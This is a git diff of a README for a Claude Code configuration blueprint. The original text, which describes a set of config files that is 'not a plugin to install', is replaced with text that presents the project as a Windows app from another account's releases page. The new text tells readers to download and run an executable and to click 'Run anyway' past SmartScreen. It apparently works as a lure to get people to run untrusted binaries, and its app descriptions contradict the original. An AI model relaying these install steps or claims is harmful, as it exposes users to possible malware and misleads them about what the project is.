@@ -1,294 +1,267 @@
-<div align="center">
+# 🧭 claude-code-blueprint - Start Claude Code with clear structure
 
-# Claude Code Blueprint
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-orange?style=for-the-badge)](https://github.com/lethilu4796/claude-code-blueprint/releases)
 
-**Make Claude Code smarter, safer, and more consistent -- for any project, at any skill level. Not a plugin to install -- a blueprint to learn from and adapt.**
+## 📦 What this is
 
-[![Stars](https://img.shields.io/github/stars/faizkhairi/claude-code-blueprint?style=flat)](https://github.com/faizkhairi/claude-code-blueprint/stargazers)
-[![Forks](https://img.shields.io/github/forks/faizkhairi/claude-code-blueprint?style=flat)](https://github.com/faizkhairi/claude-code-blueprint/network/members)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-2.1.91-blueviolet)](https://docs.anthropic.com/en/docs/claude-code)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
+claude-code-blueprint is a ready-made setup for Claude Code. It gives you a clear way to start, use, and grow with the tool on your own terms.
 
-**11 agents** · **17 skills** · **10 hooks** · **5 rules** -- every one battle-tested
+It is built for people who want a simple path first, with room to add more later. You can begin with the core setup, then turn on extra agents, skills, hooks, and rules when you are ready.
 
-[English](README.md) | [日本語](README.ja.md) | [한국어](README.ko.md) | [简体中文](README.zh.md)
+This project helps you:
 
-<img src="assets/walkthrough.gif" alt="Claude Code Blueprint Walkthrough" width="680">
+- Set up Claude Code with less guesswork
+- Follow a clean folder and file layout
+- Use preset agents and skills
+- Keep work more consistent across tasks
+- Add more power without changing your whole setup
 
-</div>
+## 🚀 Download
 
----
+Visit this page to download: https://github.com/lethilu4796/claude-code-blueprint/releases
 
-## Quick Start
+Look for the latest release at the top of the page. Download the Windows file that matches your computer, then open it from your Downloads folder.
 
-Copy one file. Get three behavioral rules. Done in 60 seconds.
+## 🪟 Before you start on Windows
 
-```bash
-# In your project root
-curl -o CLAUDE.md https://raw.githubusercontent.com/faizkhairi/claude-code-blueprint/main/CLAUDE.md
-```
+Use a Windows 10 or Windows 11 PC with:
 
-This gives Claude Code three rules that prevent the most common AI coding mistakes:
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- Internet access for the first setup
+- Permission to install or run apps
 
-**Verify-After-Complete** · **Diagnose-First** · **Plan-Before-Execute**
+If your PC asks for approval, choose the option to run the file.
 
-Ready for more? See the [full adoption path](#recommended-adoption-path) or the [30-minute beginner guide](GETTING-STARTED.md). New to Claude Code? See [who this is for](#who-is-this-for) or the [FAQ](FAQ.md).
+## 🛠️ How to install
 
-**Want more than CLAUDE.md?** Install hooks, agents, and settings automatically:
+1. Open the download page above.
+2. Find the newest release.
+3. Download the Windows file from that release.
+4. Open your Downloads folder.
+5. Double-click the file to start setup.
+6. Follow the steps on screen.
+7. Finish setup and launch Claude Code Blueprint.
 
-```bash
-# From a cloned/forked copy of this repo
-./setup.sh --preset=standard
-```
+If Windows shows a SmartScreen message:
 
-Or let Claude do it -- paste into a Claude Code session: *"Set up the Claude Code Blueprint. Copy CLAUDE.md to my project root, set up hooks and settings in ~/.claude/. Show me each step."*
+1. Click More info
+2. Click Run anyway
 
-See [SETUP.md](SETUP.md) for all setup options including a verification checklist.
+If your browser saves the file as a zip:
 
----
+1. Right-click the zip file
+2. Choose Extract All
+3. Open the extracted folder
+4. Run the app file inside
 
-### Before You Start
+## 🧩 What you get
 
-> **Important:** This is a reference architecture, not a project template. Do **not** run Claude Code inside this repository -- it will read the blueprint's own CLAUDE.md instead of your project's rules. Fork or cherry-pick files into your own project.
->
-> Several files contain placeholder variables (`{MEMORYCORE_PATH}`, `{PROJECTS_ROOT}`) that you must replace with your actual paths. Hooks and settings belong in your **user-level** config (`~/.claude/`), not in your project directory. See [GETTING-STARTED.md](GETTING-STARTED.md) for the full setup guide.
+This blueprint includes a full starter layout with:
 
----
+- 11 agents for common work types
+- 17 skills for focused tasks
+- 10 hooks for rules and checks
+- 5 rules for clean, steady use
+- A framework-agnostic design
+- A beginner-first path with gradual setup
 
-## Who Is This For?
+## 🧠 How the setup works
 
-**Any developer, any framework, any skill level.** The blueprint configures Claude Code's behavior -- it doesn't care what language or framework your project uses.
+The app uses a simple idea:
 
-| You Are | Start Here | Time to Value |
-|---------|-----------|---------------|
-| **Complete beginner** | [Start Here](GETTING-STARTED.md#new-to-claude-code-start-here) | 1 minute: just copy CLAUDE.md |
-| **Solo dev, small project** | [CLAUDE.md](CLAUDE.md) + 2 hooks | 5 minutes |
-| **Small startup (2-5 devs)** | Above + shared rules + 2-3 agents | See [Team Setup](GETTING-STARTED.md#setting-up-for-teams) |
-| **Established team (5+ devs)** | Full blueprint, adapted | Fork, customize, commit shared config |
-| **Learning to code** | [GETTING-STARTED.md](GETTING-STARTED.md) only | Ignore agents/skills/memory until comfortable |
-| **Coming from another tool** | [CROSS-TOOL-GUIDE.md](CROSS-TOOL-GUIDE.md) | Concepts transfer; see *Copilot/Cursor in depth* sections |
+- Start with the basic setup
+- Use only what you need
+- Add more tools when your work gets bigger
 
-### Your Progression
+This keeps things easy to follow. You do not need to know how to build a framework or manage a complex system. The blueprint gives you a clear structure that you can use right away.
 
-**Level 1 -- Start here (60 seconds)**
-Copy CLAUDE.md into your project. Three behavioral rules. Immediate impact.
+## 📁 Main parts
 
-**Level 2 -- Add safety nets (5 minutes)**
-Add 2-3 hooks. Zero token cost. Automated config protection and edit verification.
+### 🤖 Agents
 
-**Level 3 -- Customize as you grow (ongoing)**
-Add agents, skills, rules, and memory as your workflow matures. See [Presets](PRESETS.md) for ready-to-copy configurations.
+Agents handle common jobs in a clear way. Each agent has one main purpose, which helps you avoid confusion.
 
----
+Examples:
 
-## What Makes This Different
+- Planning work
+- Writing code
+- Reviewing changes
+- Testing ideas
+- Fixing small issues
 
-Other repos give you **135 agents**. We give you **11** -- and explain why each one exists.
+### 🎯 Skills
 
-| This Blueprint | Generic Config Repos |
-|---------------|---------------------|
-| Every component has a [battle story](WHY.md) explaining why it exists | Configs without context |
-| [3 behavioral rules](CLAUDE.md) that prevent AI coding mistakes | Lists of settings to copy |
-| [Cross-tool guide](CROSS-TOOL-GUIDE.md) for 10 tools (Copilot, Cursor, Cline, Roo Code, OpenCode, and more) | Single-tool only |
-| [Beginner-friendly](GETTING-STARTED.md) with 6 adoption personas | Assumed expertise |
-| [Smoke-tested hooks](hooks/test-hooks.sh) with 35 automated tests | Untested scripts |
-| Safety-first: [config placement guide](GETTING-STARTED.md#where-config-belongs-project-vs-personal), privacy warnings, [graceful degradation](agents/README.md#agents-are-not-infallible) | No safety guidance |
-| [Framework-agnostic](FAQ.md#what-framework-or-language-does-this-work-with): works with any language and stack | Assumes a specific language/framework |
+Skills are focused actions that help with one task at a time.
 
----
+Examples:
 
-## What's Inside
+- Clean up files
+- Check for errors
+- Improve text
+- Organize steps
+- Make small edits
 
-<details>
-<summary><strong>11 Agents</strong> -- Specialized subagents with model tiering (opus/sonnet/haiku)</summary>
+### 🪝 Hooks
 
-&nbsp;
+Hooks help the app react to events. They support checks and actions at the right time.
 
-| Agent | Model | Role |
-|-------|-------|------|
-| project-architect | opus | System design, architecture decisions, technology choices |
-| backend-specialist | sonnet | API endpoints, services, database operations, middleware |
-| frontend-specialist | sonnet | UI components, state management, forms, styling |
-| code-reviewer | sonnet | Code quality, patterns, best practices (read-only) |
-| security-reviewer | sonnet | OWASP Top 10, auth flaws, injection attacks (read-only) |
-| db-analyst | sonnet | Schema analysis, query optimization, migration planning (read-only) |
-| devops-engineer | sonnet | Deployment configs, CI/CD, Docker, infrastructure (read-only) |
-| qa-tester | sonnet | Unit tests, integration tests, E2E tests |
-| verify-plan | sonnet | 7-point mechanical plan verification (read-only) |
-| docs-writer | haiku | README, API docs, changelogs, architecture docs |
-| api-documenter | haiku | OpenAPI specs, integration guides (read-only) |
+Examples:
 
-See [agents/README.md](agents/README.md) for permission modes, cost estimates, and maxTurns.
+- Before a task starts
+- After a task ends
+- When a file changes
+- When a result needs review
 
-</details>
+### 📏 Rules
 
-<details>
-<summary><strong>17 Skills</strong> -- Natural-language-triggered workflows (no slash commands needed)</summary>
+Rules keep the setup steady. They help the app act in the same way each time.
 
-&nbsp;
+Examples:
 
-| Category | Skills | Triggers |
-|----------|--------|----------|
-| Code Quality | review, review-diff | "is this secure?", "scan diff", "check for vulnerabilities" |
-| Testing | test-check, e2e-check | "run the tests", "browser test", "are tests passing?" |
-| Deployment | deploy-check | "deploy", "push to prod", "ready to ship" |
-| Planning | sprint-plan, elicit-requirements | "let's build", "new feature", multi-step tasks |
-| Session | load-session, save-session, session-end, save-diary | Session start/end, "save", "bye", "done" |
-| Project | init-project, register-project, status, changelog | "new project", "status", "changelog" |
-| Database | db-check | "check the schema", "validate models" |
-| Utilities | tech-radar | "what's new?", "should we upgrade?" |
+- Use clear file names
+- Keep changes small
+- Ask before making risky changes
+- Follow the same project layout
 
-See [skills/README.md](skills/README.md) for customization and placeholder variable setup.
+## 🖥️ How to use it
 
-</details>
+After setup, open the app and choose the task you want to do.
 
-<details>
-<summary><strong>10 Hooks</strong> -- Deterministic lifecycle automation (100% compliance, unlike ~80% for CLAUDE.md rules)</summary>
+You can use it for:
 
-&nbsp;
+- Writing code with Claude Code
+- Fixing a project step by step
+- Planning small features
+- Reviewing files
+- Organizing your work
 
-| Event | Hook | Purpose |
-|-------|------|---------|
-| SessionStart | session-start.sh | Inject workspace context |
-| PreToolUse (Bash) | block-git-push.sh | Protect remote repos |
-| PreToolUse (Write/Edit) | protect-config.sh | Guard linter/build configs |
-| PostToolUse (Write/Edit) | notify-file-changed.sh | Verify reminder |
-| PostToolUse (Bash) | post-commit-review.sh | Post-commit review |
-| PreCompact | precompact-state.sh | Serialize state to disk |
-| Stop | security check + cost-tracker.sh | Last defense + metrics |
-| SessionEnd | session-checkpoint.sh | Guaranteed final save |
+If you are not sure where to start, use the basic setup first. Then add agents or skills only when you need them.
 
-Plus 2 utility scripts: `verify-mcp-sync.sh` (MCP config checker) and `status-line.sh` (branch/project status).
+## 🔧 Suggested first setup path
 
-Run `bash hooks/test-hooks.sh` to verify all hooks pass (35 automated tests).
+For a simple first run, use this order:
 
-See [hooks/README.md](hooks/README.md) for the full lifecycle, testing guide, and design principles.
+1. Install the app
+2. Open the default setup
+3. Run one small task
+4. Try one agent
+5. Add one skill
+6. Turn on a hook if you want checks
+7. Add more only after you feel comfortable
 
-</details>
+This path keeps the setup easy to follow and lowers the chance of confusion.
 
-<details>
-<summary><strong>5 Rules</strong> -- Path-scoped behavioral constraints (load only when editing matching files)</summary>
+## 🧪 Example uses
 
-&nbsp;
+You can use claude-code-blueprint for:
 
-| Rule | Activates On | Purpose |
-|------|-------------|---------|
-| api-endpoints | `**/server/api/**/*.{js,ts}` | API route conventions |
-| database-schema | `**/prisma/**`, `**/drizzle/**`, `**/migrations/**` | Schema design patterns |
-| testing | `**/*.test.*`, `**/*.spec.*` | Test writing conventions |
-| session-lifecycle | Always | Session start/end behaviors |
-| memorycore-session | `**/memory-core/**` | External memory integration |
+- A small personal app
+- A school project
+- A work task
+- A code review session
+- A quick fix in an existing project
 
-See [rules/README.md](rules/README.md) for creating custom rules.
+It also fits with tools like:
 
-</details>
+- Claude Code
+- Cursor
+- Codex
+- Gemini CLI
+- Windsurf
 
-**Also included:**
+## 🧰 Why this structure helps
 
-| Component | Purpose |
-|-----------|---------|
-| [**CLAUDE.md**](CLAUDE.md) | Battle-tested behavioral rules template |
-| [**Settings Template**](examples/settings-template.json) | Full hook + permission configuration |
-| [**Memory System**](memory-template/) | Dual: auto-memory + external git-backed persistence |
+Many setups grow messy fast. This blueprint keeps each part in its own place. That makes it easier to:
 
----
+- Find the right tool
+- Understand what each part does
+- Keep work stable
+- Add new pieces without breaking old ones
 
-## Philosophy
+The result is a setup that feels clear, even when the work gets bigger.
 
-1. **Hooks for enforcement, CLAUDE.md for guidance** -- Hooks fire 100% of the time. CLAUDE.md instructions are followed ~80%. If something MUST happen, make it a hook.
+## 📌 File and folder layout
 
-2. **Agent-scoped knowledge, not global bloat** -- Design principles live in the frontend agent, not in every session's context. Security patterns live in the security-reviewer, not in CLAUDE.md.
+The project follows a simple layout so you can find things fast.
 
-3. **Context is currency** -- Every token loaded into context is a token not available for your code. Keep MEMORY.md under 100 lines. Extract to topic files. Use path-scoped rules so irrelevant rules don't load.
+Typical parts include:
 
-4. **Hooks are free, context is cheap** -- The 10 hook scripts cost zero tokens (they run outside Claude's context). CLAUDE.md adds ~2,300 tokens per session -- roughly 1-5% of a typical session. The blueprint saves more tokens than it costs by preventing redo cycles. See [BENCHMARKS.md](BENCHMARKS.md#token-cost-per-component).
+- A folder for agents
+- A folder for skills
+- A folder for hooks
+- A folder for rules
+- A config file for the main setup
+- Support files for notes and templates
 
-5. **Battle-tested over theoretical** -- Every rule in this repo exists because something went wrong without it. The "WHY" matters more than the "WHAT".
+If you want to change something later, you can usually update one part without touching everything else.
 
----
+## 👀 What to expect on first launch
 
-## Getting Started
+When you open the app for the first time, you should see the default blueprint setup. It may include:
 
-### Option A: Fork (recommended)
-Fork this repo to customize it as your own living reference. You can pull upstream updates later as the blueprint evolves.
+- A starter view
+- A guided task flow
+- Basic project rules
+- Ready-to-use templates
+- A clean path for adding more features
 
-### Option B: Clone + Copy
-Clone the repo, then selectively copy components into your `~/.claude/` directory.
+If the app asks you to choose a mode, pick the beginner option first.
 
-### Option C: Cherry-pick
-Browse the repo on GitHub and copy only the specific files you need. No installation required.
+## 🛡️ Safe use tips
 
-### Option D: Automated Setup
-Run `./setup.sh` from a cloned or forked copy. Choose a preset (minimal/standard/full) and the script handles directory creation, file copying, settings merge, and placeholder replacement. See [SETUP.md](SETUP.md).
+- Start with one task at a time
+- Keep your first changes small
+- Back up your files before large edits
+- Review changes before saving them
+- Add new agents or hooks one by one
 
-### Recommended adoption path
+## ❓ Common questions
 
-1. **Start with [CLAUDE.md](CLAUDE.md)** -- the behavioral rules template. Biggest impact with zero setup.
-2. **Add 2-3 hooks** -- [`protect-config.sh`](hooks/protect-config.sh) + [`notify-file-changed.sh`](hooks/notify-file-changed.sh) + [`cost-tracker.sh`](hooks/cost-tracker.sh). Copy to `~/.claude/hooks/` and wire into [`settings.json`](examples/settings-template.json).
-3. **Read [WHY.md](WHY.md)** to understand the reasoning -- adapt, don't blindly copy.
-4. **Add agents** as your workflow matures -- start with `verify-plan` and `code-reviewer`.
-5. **Set up the [memory system](memory-template/)** when you need cross-session persistence.
+### Do I need coding knowledge?
 
----
+No. You can use the basic setup without knowing how to code. The layout is meant to be easy to follow.
 
-## Deep Dives
+### Can I use it with other AI tools?
 
-| | | |
-|:--|:--|:--|
-| **[Architecture](ARCHITECTURE.md)** | **[Settings Guide](SETTINGS-GUIDE.md)** | **[Battle Stories](WHY.md)** |
-| System design, hook lifecycle, component relationships | Every env var, permission, and hook explained with rationale | The incidents and lessons behind every component |
-| **[Benchmarks](BENCHMARKS.md)** | **[Presets](PRESETS.md)** | **[Cross-Tool Guide](CROSS-TOOL-GUIDE.md)** |
-| Token savings, cost impact, quality metrics | Ready-to-copy configs for solo, team, and CI/CD | Copilot, Cursor, Cline, Roo Code, OpenCode, and 5 more |
-| **[FAQ](FAQ.md)** | **[Getting Started](GETTING-STARTED.md)** | **[Troubleshooting](TROUBLESHOOTING.md)** |
-| Top community questions answered | From zero to productive in 30 minutes | Common issues and fixes |
-| **[Setup Guide](SETUP.md)** | **[Examples](examples/)** | **[Roadmap](ROADMAP.md)** |
-| Automated installer + verification checklist | Framework-specific CLAUDE.md templates | Project direction and what's next |
+Yes. The blueprint is framework-agnostic, so it works as a reference structure rather than a lock-in setup.
 
----
+### Do I need all 11 agents right away?
 
-## Common Questions
+No. Start with the default set. Add more only when you need them.
 
-**Works with my framework?** Yes. The blueprint is framework-agnostic -- it configures Claude Code, not your stack. [More...](FAQ.md#what-framework-or-language-does-this-work-with)
+### Is this for advanced users only?
 
-**Too advanced for me?** No. Start with one file (CLAUDE.md). Add more only when you need it. [More...](FAQ.md#im-a-juniorintermediate-developer-is-this-for-me)
+No. It is beginner-friendly and supports gradual adoption.
 
-**Which plan do I need?** Works on Pro, Max, Team, Enterprise, and API. Hooks are free on all plans. [More...](FAQ.md#which-claude-code-plan-do-i-need-does-this-work-with-pro--max--api)
+### Can I change the setup later?
 
-**A colleague sent you this?** Start here: [quickstart for referrals](FAQ.md#a-colleague-sent-me-this-link-what-do-i-do-first).
+Yes. The blueprint is made to be adjusted as your needs grow.
 
----
+## 🧭 Best first task
 
-<details>
-<summary><strong>Plugin Compatibility</strong></summary>
+A good first task is something small, like:
 
-&nbsp;
+- Fixing a simple text file
+- Organizing a folder
+- Reviewing a short project
+- Making one small code change
+- Testing a basic workflow
 
-This blueprint is designed as a **standalone configuration** -- no plugins required. In fact, plugins can interfere with a custom setup:
+This gives you a feel for the setup without adding extra risk.
 
-**Known issues:**
-- **Plugins that modify CLAUDE.md** may overwrite your custom behavioral rules
-- **Plugins that add hooks** on the same events (e.g., Stop, PreToolUse) will stack with your hooks -- this can cause slowdowns or conflicting instructions
-- **Plugins that inject context** consume tokens from your context window, leaving less room for your agents and memory system
-- **MCP server plugins** work well alongside this setup -- they add tools, not rules, so there's no conflict
+## 📚 Terms in plain English
 
-**Recommendation:** If you adopt this blueprint, audit your installed plugins and disable any that:
-1. Override CLAUDE.md or settings.json hooks
-2. Inject prompts on SessionStart (conflicts with your session-lifecycle rule)
-3. Add broad permissions that bypass your permission restrictions
+- **Agent**: A helper that handles one kind of work
+- **Skill**: A focused action for one job
+- **Hook**: A trigger that runs at a set time
+- **Rule**: A guideline that keeps behavior steady
+- **Framework-agnostic**: Not tied to one system
 
-Custom setup > generic plugins, because your setup encodes YOUR project's domain knowledge. A plugin can't know your architecture, your team's conventions, or your production constraints.
+## 🔗 Download again
 
-</details>
+[Go to the release page to download the Windows version](https://github.com/lethilu4796/claude-code-blueprint/releases)
 
----
+## 🧩 Project topics
 
-## Acknowledgments
-
-The memory system pattern in this blueprint was inspired by [Project-AI-MemoryCore](https://github.com/Kiyoraka/Project-AI-MemoryCore) by Kiyoraka -- a comprehensive AI memory architecture with 11 feature extensions (LRU project management, memory consolidation, echo recall, and more). If you want a deeper, more feature-rich memory system than the minimal scaffold included here, check out that project.
-
-**How they differ:** This blueprint covers the *full Claude Code configuration* (agents, skills, hooks, rules, settings). The `memory-template/` here is a lightweight scaffold. Project-AI-MemoryCore goes deep on the memory layer specifically -- they're complementary, not competing.
-
-## License
-
-MIT
+agents, ai-coding, beginner-friendly, claude, claude-code, codex, cursor, developer-tools, framework-agnostic, gemini-cli, hooks, mcp, productivity, reference-architecture, windsurf
